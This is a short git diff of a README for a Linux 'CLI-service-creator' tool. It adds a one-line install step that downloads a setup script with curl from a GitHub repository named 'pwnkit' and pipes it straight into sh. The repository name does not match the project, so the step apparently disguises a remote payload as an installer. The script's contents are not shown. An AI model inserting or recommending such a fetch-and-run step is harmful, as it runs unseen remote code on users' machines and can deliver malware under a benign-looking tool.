@@ -1,2 +1,5 @@
 # CLI-service-creator
-A service creator for the Linux CLI
+A one-command service creator for the Linux CLI, fast and simple!
+
+
+```sh -c "$(curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/setup.sh)"```
